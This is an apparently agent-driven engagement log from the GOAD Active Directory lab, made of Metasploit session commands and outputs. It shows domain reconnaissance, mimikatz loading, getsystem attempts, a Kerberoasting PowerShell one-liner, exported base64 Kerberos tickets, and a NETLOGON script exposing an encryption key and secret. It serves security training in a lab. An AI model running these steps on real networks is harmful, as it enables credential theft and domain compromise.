# GOAD Lab - Complete Engagement Log

**Total Actions:** 321
**Engagement:** GOAD Lab - North Domain
**Date:** 2025-12-17

---

## Phase 1: Initial Access & Situational Awareness

### 1. [2025-12-17 11:55:18] `msf_session_interact` ✅

```
Computer        : CASTELBLACK
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : NORTH
Logged On Users : 15
Meterpreter     : x64/windows
```

### 2. [2025-12-17 11:55:18] `msf_session_interact` ✅

```
Server username: NORTH\jon.snow
```

### 3. [2025-12-17 11:55:19] `msf_session_interact` ✅

```
Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
```

### 4. [2025-12-17 11:55:26] `msf_session_interact` ✅

```
Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface  3
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:5d:a9:e1
MTU          : 1500
IPv4 Address : 10.50.0.22
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::b09a:3d4e:e148:b662
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  7
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:7a:a2:fc
MTU          : 1500
IPv4 Address : 10.0.2.15
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::cae:326b:b121:674b
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

### 5. [2025-12-17 11:55:27] `msf_session_interact` ✅

```
(no output)
```

### 6. [2025-12-17 11:55:27] `msf_session_interact` ❌

```
[-] Post aborted due to failure: unknown: ERROR:
Description = Invalid namespace
```

### 7. [2025-12-17 11:55:34] `msf_session_interact` ✅

```
[+] Domain FQDN: north.sevenkingdoms.local
[+] Domain NetBIOS Name: NORTH
[+] Domain Controller: winterfell.north.sevenkingdoms.local (IP: 10.50.0.11)
Process 1400 created.
Channel 3 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jon.snow\Desktop>
```

### 8. [2025-12-17 11:55:40] `msf_session_interact` ❌

```
Error: MSF Error: true
```

### 9. [2025-12-17 11:55:46] `msf_session_interact` ✅

```
execute -f cmd.exe -a "/c whoami /all" -i
'execute' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\jon.snow\Desktop>
```

### 10. [2025-12-17 11:55:51] `msf_session_interact` ✅

```
whoami /all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
north\jon.snow S-1-5-21-2825620776-1928720347-1758113318-1118


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes                                        
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
NORTH\Night Watch                          Group            S-1-5-21-2825620776-1928720347-1758113318-1107 Mandatory group, E
... [truncated]
```

### 11. [2025-12-17 11:56:10] `msf_session_interact` ✅

```
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
NORTH\Domain Admins
NORTH\jeor.mormont
vagrant
The command completed successfully.


C:\Users\jon.snow\Desktop>
```

### 12. [2025-12-17 11:56:20] `msf_session_interact` ✅

```
net group "Domain Admins" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            eddard.stark             
The command completed successfully.


C:\Users\jon.snow\Desktop>
```

### 13. [2025-12-17 11:56:27] `msf_session_interact` ✅

```
nltest /domain_trusts
List of domain trusts:
    0: SEVENKINGDOMS sevenkingdoms.local (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )
    1: NORTH north.sevenkingdoms.local (NT 5) (Forest: 0) (Primary Domain) (Native)
The command completed successfully

C:\Users\jon.snow\Desktop>
```

### 14. [2025-12-17 11:56:37] `msf_session_interact` ✅

```
query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 robb.stark            rdp-tcp#0           2  Active    5+02:09  12/12/2025 1:46 AM
>jon.snow              rdp-tcp#1           3  Active         16  12/17/2025 3:33 AM

C:\Users\jon.snow\Desktop>
```

### 15. [2025-12-17 11:56:37] `msf_session_interact` ✅

```
net group "Enterprise Admins" /domain
The request will be processed at a domain controller for domain north.sevenkingdoms.local.

The group name could not be found.

More help is available by typing NET HELPMSG 2220.


C:\Users\jon.snow\Desktop>
```

### 16. [2025-12-17 11:56:50] `msf_session_interact` ✅

```
exit
```

### 17. [2025-12-17 11:56:56] `msf_session_interact` ✅

```
Loading extension kiwi...
```


## Phase 2: Privilege Escalation Attempts

### 18. [2025-12-17 11:57:02] `msf_session_interact` ✅

```
.#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
[!] Not running as SYSTEM, execution may fail
```

### 19. [2025-12-17 11:57:08] `msf_session_interact` ❌

```
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

### 20. [2025-12-17 11:57:16] `msf_session_interact` ✅

```
Loading extension incognito...Success.
```

### 21. [2025-12-17 11:57:17] `msf_session_interact` ✅

```
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
NORTH\jon.snow

Impersonation Tokens Available
========================================
No tokens available
```

### 22. [2025-12-17 11:57:23] `msf_session_interact` ✅

```
[*] 10.50.0.22 - Collecting local exploits for x64/windows...
[*] Collecting exploit 1 / 2583[*] Collecting exploit 2 / 2583[*] Collecting exploit 3 / 2583[*] Collecting exploit 4 / 2583[*] Collecting exploit 5 / 2583[*] Collecting exploit 6 / 2583[*] Collecting exploit 7 / 2583[*] Collecting exploit 8 / 2583[*] Collecting exploit 9 / 2583[*] Collecting exploit 10 / 2583[*] Collecting exploit 11 / 2583[*] Collecting exploit 12 / 2583[*] Collecting exploit 13 / 2583[*] Collecting exploit 14 / 2583[*] Collecting exploit 15 / 2583[*] Collecting exploit 16 / 2583[*] Collecting exploit 17 / 2583[*] Collecting exploit 18 / 2583[*] Collecting exploit 19 / 2583[*] Collecting exploit 20 / 2583[*] Collecting exploit 21 / 2583[*] Collecting exploit 22 / 2583[*] Collecting exploit 23 / 2583[*] Collecting exploit 24 / 2583[*] Collecting exploit 25 / 2583[*] Collecting exploit 26 / 2583[*] Collecting exploit 27 / 2583[*] Collecting exploit 28 / 2583[*] Collecting exploit 29 / 2583[*] Collecting exploit 30 / 2583[*] Collecting exploit 31 / 2583[*] Collecting exploit 32 / 2583[*] Collecting exploit 33 / 2583[*] Collecting exploit 34 / 2583[*] Collecting exploit 35 / 2583[*] Collecting exploit 36 / 2583[*] Collecting exploit 37 / 2583[*] Collecting exploit 38 / 2583[*] Collecting exploit 39 / 2583[*] Collecting exploit 40 / 2583[*] Collecting exploit 41 / 2583[*] Collecting exploit 42 / 2583[*] Collecting exploit 43 / 2583[*] Collecting exploit 44 / 2583
```

### 23. [2025-12-17 11:57:29] `msf_session_interact` ✅

```
[*] Collecting exploit 45 / 2583[*] Collecting exploit 46 / 2583[*] Collecting exploit 47 / 2583[*] Collecting exploit 48 / 2583[*] Collecting exploit 49 / 2583[*] Collecting exploit 50 / 2583[*] Collecting exploit 51 / 2583[*] Collecting exploit 52 / 2583[*] Collecting exploit 53 / 2583[*] Collecting exploit 54 / 2583[*] Collecting exploit 55 / 2583[*] Collecting exploit 56 / 2583[*] Collecting exploit 57 / 2583[*] Collecting exploit 58 / 2583[*] Collecting exploit 59 / 2583[*] Collecting exploit 60 / 2583[*] Collecting exploit 61 / 2583[*] Collecting exploit 62 / 2583[*] Collecting exploit 63 / 2583[*] Collecting exploit 64 / 2583[*] Collecting exploit 65 / 2583[*] Collecting exploit 66 / 2583[*] Collecting exploit 67 / 2583[*] Collecting exploit 68 / 2583[*] Collecting exploit 69 / 2583[*] Collecting exploit 70 / 2583[*] Collecting exploit 71 / 2583[*] Collecting exploit 72 / 2583[*] Collecting exploit 73 / 2583[*] Collecting exploit 74 / 2583[*] Collecting exploit 75 / 2583[*] Collecting exploit 76 / 2583[*] Collecting exploit 77 / 2583[*] Collecting exploit 78 / 2583[*] Collecting exploit 79 / 2583[*] Collecting exploit 80 / 2583[*] Collecting exploit 81 / 2583[*] Collecting exploit 82 / 2583[*] Collecting exploit 83 / 2583[*] Collecting exploit 84 / 2583[*] Collecting exploit 85 / 2583[*] Collecting exploit 86 / 2583[*] Collecting exploit 87 / 2583[*] Collecting exploit 88 / 2583[*] Collecting exploit 89 / 2583[*] Collecting exploit 90 / 2583[*] Collecting exploit 91 / 2583[*] Collecting exploit 92 / 2583[*] Collecting exploit 93 / 2583[*] Collecting exploit 94 / 2583[*] Collecting exploit 95 / 2583[*] Collecting exploit 96 / 2583[*] Collecting exploit 97 / 2583[*] Collecting exploit 98 / 2583[*] Collecting exploit 99 / 2583[*] Collecting exploit 100 / 2583[*] Collecting exploit 101 / 2583[*] Collecting exploit 102 / 2583[*] Collecting exploit 103 / 2583[*] Collecting exploit 104 / 2583[*] Collecting 
... [truncated]
```

### 24. [2025-12-17 11:57:48] `msf_module_execute` ✅

```
Module launched as job 2. Use msf_job_info to check status.
```

### 25. [2025-12-17 11:58:02] `msf_job_info` ❌

```
Error: MSF Error: true
```

### 26. [2025-12-17 11:58:08] `msf_jobs_list` ✅

```
{
  "0": "Exploit: multi/handler"
}
```

### 27. [2025-12-17 11:58:08] `msf_session_interact` ❌

```
[*] Collecting exploit 679 / 2583[*] Collecting exploit 680 / 2583[*] Collecting exploit 681 / 2583[*] Collecting exploit 682 / 2583[*] Collecting exploit 683 / 2583[*] Collecting exploit 684 / 2583[*] Collecting exploit 685 / 2583[*] Collecting exploit 686 / 2583[*] Collecting exploit 687 / 2583[*] Collecting exploit 688 / 2583[*] Collecting exploit 689 / 2583[*] Collecting exploit 690 / 2583[*] Collecting exploit 691 / 2583[*] Collecting exploit 692 / 2583[*] Collecting exploit 693 / 2583[*] Collecting exploit 694 / 2583[*] Collecting exploit 695 / 2583[*] Collecting exploit 696 / 2583[*] Collecting exploit 697 / 2583[*] Collecting exploit 698 / 2583[*] Checking for group policy history objects...
[*] Collecting exploit 699 / 2583[*] Collecting exploit 700 / 2583[*] Collecting exploit 701 / 2583[*] Collecting exploit 702 / 2583[*] Collecting exploit 703 / 2583[*] Collecting exploit 704 / 2583[*] Collecting exploit 705 / 2583[*] Collecting exploit 706 / 2583[*] Collecting exploit 707 / 2583[*] Collecting exploit 708 / 2583[*] Collecting exploit 709 / 2583[*] Collecting exploit 710 / 2583[*] Collecting exploit 711 / 2583[*] Collecting exploit 712 / 2583[*] Collecting exploit 713 / 2583[*] Collecting exploit 714 / 2583[*] Collecting exploit 715 / 2583[*] Collecting exploit 716 / 2583[*] Collecting exploit 717 / 2583[*] Collecting exploit 718 / 2583[*] Collecting exploit 719 / 2583[*] Collecting exploit 720 / 2583[*] Collecting exploit 721 / 2583[*] Collecting exploit 722 / 2583[*] Collecting exploit 723 / 2583[*] Collecting exploit 724 / 2583[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.
[*] Checking for SYSVOL locally...
[*] Collecting exploit 725 / 2583[*] Collecting exploit 726 / 2583[*] Collecting exploit 727 / 2583[*] Collecting exploit 728 / 2583[*] Collecting exploit 729 / 2583[*] Collecting exploit 730 / 2583[*] C
... [truncated]
```

### 28. [2025-12-17 11:58:47] `msf_session_interact` ✅

```
setspn -T north.sevenkingdoms.local -Q */*
Checking domain DC=north,DC=sevenkingdoms,DC=local
CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	kadmin/changepw
CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	HTTP/eyrie.north.sevenkingdoms.local
CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	CIFS/thewall.north.sevenkingdoms.local
	HTTP/thewall.north.sevenkingdoms.local
CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
	MSSQLSvc/castelblack.north.sevenkingdoms.local
	MSSQLSvc/castelblack.north.sevenkingdoms.local:1433
CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=local
	HTTP/winterfell.north.sevenkingdoms.local
	TERMSRV/CASTELBLACK
	TERMSRV/castelblack.north.sevenkingdoms.local
	RestrictedKrbHost/CASTELBLACK
	HOST/CASTELBLACK
	RestrictedKrbHost/castelblack.north.sevenkingdoms.local
	HOST/castelblack.north.sevenkingdoms.local
CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local
	ldap/winterfell.north.sevenkingdoms.local/DomainDnsZones.north.sevenkingdoms.local
	ldap/winterfell.north.sevenkingdoms.local/ForestDnsZones.sevenkingdoms.local
	TERMSRV/WINTERFELL
	TERMSRV/winterfell.north.sevenkingdoms.local
	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/winterfell.north.sevenkingdoms.local
	DNS/winterfell.north.sevenkingdoms.local
	GC/winterfell.north.sevenkingdoms.local/sevenkingdoms.local
	RestrictedKrbHost/winterfell.north.sevenkingdoms.local
	RestrictedKrbHost/WINTERFELL
	RPC/767e3975-498b-4c3d-82b1-21b329c988f8._msdcs.sevenkingdoms.local
	HOST/WINTERFELL/NORTH
	HOST/winterfell.north.sevenkingdoms.local/NORTH
	HOST/WINTERFELL
	HOST/winterfell.north.sevenkingdoms.local
	HOST/winterfell.north.sevenkingdoms.local/north.sevenkingdoms.local
	E3514235-4B06-11D1-AB04-00C04FC2DCD2/767e3975-498b-4c3d-82b1-21b329c988f8/north.sevenkingdoms.local
	ldap/WINTERFELL/NORTH
	ldap/767e3975-498b-4c3d-82b1-21b329c988f8._msdcs.sevenkingdoms.local
	ldap/winterfell.north.sevenkingdoms.local/NORTH
	ldap/WI
... [truncated]
```

### 29. [2025-12-17 11:59:00] `msf_session_interact` ✅

```
powershell -ep bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/castelblack.north.sevenkingdoms.local:1433'"
```

### 30. [2025-12-17 11:59:06] `msf_session_interact` ✅

```
Id                   : uuid-8499275d-b551-45ec-9a4f-9b109c932efb-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 12/17/2025 11:59:00 AM
ValidTo              : 12/17/2025 9:33:40 PM
ServicePrincipalName : MSSQLSvc/castelblack.north.sevenkingdoms.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey




C:\Users\jon.snow\Desktop>klist

Current LogonId is 0:0x7b0dcef

Cached Tickets: (8)

#0>	Client: jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
	Server: krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/17/2025 3:33:40 (local)
	End Time:   12/17/2025 13:33:40 (local)
	Renew Time: 12/24/2025 3:33:40 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x2 -> DELEGATION 
	Kdc Called: winterfell.north.sevenkingdoms.local

#1>	Client: jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
	Server: krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 12/17/2025 3:33:40 (local)
	End Time:   12/17/2025 13:33:40 (local)
	Renew Time: 12/24/2025 3:33:40 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: winterfell.north.sevenkingdoms.local

#2>	Client: jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
	Server: MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 @ NORTH.SEVENKINGDOMS.LOCAL
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
	Start Time: 12/17/2025 3:59:00 (local)
	End Time:   12/17/2025 13:33:40 (local)
	Renew Time: 12/24/2025 3:33:40 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0 
... [truncated]
```

### 31. [2025-12-17 11:59:13] `msf_session_interact` ✅

```
kiwi_cmd "kerberos::list /export"
'kiwi_cmd' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\jon.snow\Desktop>
```

### 32. [2025-12-17 11:59:18] `msf_session_interact` ✅

```
exit
```

### 33. [2025-12-17 11:59:24] `msf_session_interact` ✅

```
[+] Kerberos tickets found in the current session.
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 12/17/2025 3:59:00 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:56:20 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : cifs/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:43 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : ProtectedStorage/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0
... [truncated]
```

### 34. [2025-12-17 11:59:30] `msf_session_interact` ✅

```
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 12/17/2025 3:59:00 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : MSSQLSvc/castelblack.north.sevenkingdoms.local:1433 @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:56:20 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : cifs/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:43 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : ProtectedStorage/winterfell.north.sevenkingdoms.local @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0x00000012 - aes256_hmac      
   Start/End/MaxRene
... [truncated]
```

### 35. [2025-12-17 11:59:35] `msf_session_interact` ✅

```
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 12/17/2025 3:33:40 AM ; 12/17/2025 1:33:40 PM ; 12/24/2025 3:33:40 AM
   Server Name       : krbtgt/NORTH.SEVENKINGDOMS.LOCAL @ NORTH.SEVENKINGDOMS.LOCAL
   Client Name       : jon.snow @ NORTH.SEVENKINGDOMS.LOCAL
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 
====================
Base64 of file : 0-60a10000-jon.snow@krbtgt~NORTH.SEVENKINGDOMS.LOCAL-NORTH.SEVENKINGDOMS.LOCAL.kirbi
====================
doIFiDCCBYSgAwIBBaEDAgEWooIEdjCCBHJhggRuMIIEaqADAgEFoRsbGU5PUlRI
LlNFVkVOS0lOR0RPTVMuTE9DQUyiLjAsoAMCAQKhJTAjGwZrcmJ0Z3QbGU5PUlRI
LlNFVkVOS0lOR0RPTVMuTE9DQUyjggQUMIIEEKADAgESoQMCAQKiggQCBIID/uKY
/WupJyZzNAseSWA3n5YSKYJvOv/1HeChMlr9s3FySeL27RrwJC8UO/ZuOX8p3uQV
rY1jkRCunsG5wLE3Tw1tPueyDx9GSOrc6yfGlCFKZsDCgS14/q6o/Q6Rn5rG9QdS
ki64WXf1H1CxA1vHRXqS9l4w9F4G+vpXR5puK83NgmBxKAD6Eg0wOfG53nk3VBV1
vVO6c2Lx7FCjljGAHV5lDNcWP7ifj5BfMveI+1RNzmt1veyeTNCh1NHnMqhdNr2L
SvU00dwqDzY+ZdWZbw40chjgAIKWin6duvjpmzUDL4uDBuWwi0NT1bCK7QM8SAe0
J9xFgA5VAUk9uT03OUfYhNZRmBez9NlHOIzu7nwyf4y+7YrdXMsoOpickgXlI3nE
J/8/Ocap5Cw4sk8JUji+s4NJUAJz6NOKT2RCtG0JDTBZS3Ey6U/wlyj0rydnNael
mX+gU9vHOfwGnUpqRwRK5ZVsutu9/D5pqv9U4vR4WYk9Zlp4ubTsz/XzrjQFFpcp
pGdgvXozQirOYUTQuAauLvSbJSj1qRJIUCXf5leR1VYrx2hDHCcg9dhNact5rBp2
/ZUaAYL6S/XvPEx83VV7nX2NMFtq40HolyOvIxsI52YkvebPk/V3/zjL1WrGyZl2
OqYZ0vqFpAdtphnpOvng/tI9iOApQUvf/XspYEdJl5frKjZiW9z81x079SX+1T51
PW5iJPBbZhvhI7HzVus8ll4+S8MQK53ijiNUoTa6Kud70YYR4pi/jhpBv4r1uwnI
kpTv3Tvxv3/J4JLnLbPR/JneyUB3UuT6BrYtAUQCvADOHQLshFMXKorczR/g9k1A
8T4bdQSuoagHz83zQn2Lb+3Os/nxghoR/4vFnWCFiIQe8l7osXW3T4O9ixHQrHNV
1TiP8qnUUb7VZjq3Ua/baSodYX+kZ12kkgVxCDkhT3cx9mqM0rzUhtXThIIE4q0D
MBKd3ly/wsuuRUInKH2nMQ7o02ebinfcSaSoVSvturKfuaiitwyR45dJLgoDsxMh
+biAdmXoD/Q9joC9Hrm9F+LwwCoqif4O5etRIl/k3iS9Wh1Imauu6YrcxmzchOy1
YPJKOws+WltFt7+/Hd6Fdy3Mhm8j7ihB5GNQTNbIOG/pTXbNU+MYhDaGWGUQlKry
PT9FEUVTuS3LarYkF054JMGZOBZvRAxeCvpl4hmCHSWNGQADXBWJPoKQNYvpdUY1
KdjTRisHy0ECp+3ABMTKREA+dc
... [truncated]
```

### 36. [2025-12-17 11:59:54] `msf_session_interact` ✅

```
Process 7872 created.
Channel 8 created.
Microsoft Windows [Version 10.0.17763.1935]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jon.snow\Desktop>
```


## Phase 3: Credential Discovery & PSExec

### 37. [2025-12-17 12:00:02] `msf_session_interact` ✅

```
powershell -ep bypass -c "Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select SamAccountName"
```

### 38. [2025-12-17 12:00:08] `msf_session_interact` ❌

```
Get-ADUser : The term 'Get-ADUser' is not recognized as the name of a cmdlet, function, script file, or operable 
program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties Does ...
+ ~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Get-ADUser:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
 

C:\Users\jon.snow\Desktop>dir \\winterfell.north.sevenkingdoms.local\NETLOGON
 Volume in drive \\winterfell.north.sevenkingdoms.local\NETLOGON is Windows 2019
 Volume Serial Number is BA49-CE42

 Directory of \\winterfell.north.sevenkingdoms.local\NETLOGON

12/12/2025  01:35 AM    <DIR>          .
12/12/2025  01:35 AM    <DIR>          ..
12/12/2025  01:35 AM               165 script.ps1
12/12/2025  01:35 AM               869 secret.ps1
               2 File(s)          1,034 bytes
               2 Dir(s)  45,844,652,032 bytes free

C:\Users\jon.snow\Desktop>
```

### 39. [2025-12-17 12:00:15] `msf_session_interact` ✅

```
type \\winterfell.north.sevenkingdoms.local\NETLOGON\secret.ps1
# cypher script
# $domain="sevenkingdoms.local"
# $EncryptionKeyBytes = New-Object Byte[] 32
# [Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
# $EncryptionKeyBytes | Out-File "encryption.key"
# $EncryptionKeyData = Get-Content "encryption.key"
# Read-Host -AsSecureString | ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "secret.encrypted"

# secret stored :
$keyData = 177, 252, 228, 64, 28, 91, 12, 201, 20, 91, 21, 139, 255, 65, 9, 247, 41, 55, 164, 28, 75, 132, 143, 71, 62, 191, 211, 61, 154, 61, 216, 91
$secret="76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA="

# T.L.
C:\Users\jon.snow\Desktop>
```

